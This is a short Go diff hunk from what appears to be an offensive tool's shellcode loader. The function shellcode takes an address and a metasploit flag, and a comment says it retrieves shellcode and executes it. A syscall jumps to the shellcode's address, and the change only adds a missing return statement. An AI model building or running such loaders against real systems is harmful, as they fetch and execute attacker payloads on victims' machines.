@@ -98,6 +98,7 @@ func shellcode(address string, metasploit bool) error {
 		return err
 	}
 	syscall.Syscall(addr, 0, 0, 0, 0)
+	return nil
 }
 
 // Shellcode retrieves shellcode and executes it
